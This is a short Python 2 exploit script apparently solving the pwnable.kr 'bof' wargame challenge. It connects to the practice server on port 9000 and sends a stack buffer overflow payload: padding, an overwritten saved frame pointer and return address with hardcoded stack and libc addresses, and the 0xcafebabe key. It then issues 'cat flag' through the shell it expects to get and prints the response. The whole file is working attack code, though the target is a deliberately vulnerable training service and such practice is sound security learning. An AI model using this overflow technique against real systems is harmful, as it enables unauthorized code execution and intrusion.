import socket
from time import sleep

IP = 'pwnable.kr'
#IP = '127.0.0.1'
PORT = 9000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((IP,PORT))
trash = '0'*0x2c
ebp = '\xd8\x70\xde\xff'
ret = '\x9f\x46\x79\xf7'
cafebabe = '\xbe\xba\xfe\xca'

cmd = "cat flag"

tosend = trash+ebp+ret+cafebabe
print 'send: %s' % tosend
sock.sendall(tosend + '\n\r\n')
print 'send: %s' % cmd
sock.sendall(cmd + '\n\r\n')
sleep(5)
buf = sock.recv(1024)
print 'recv: %s' % buf

sock.close()
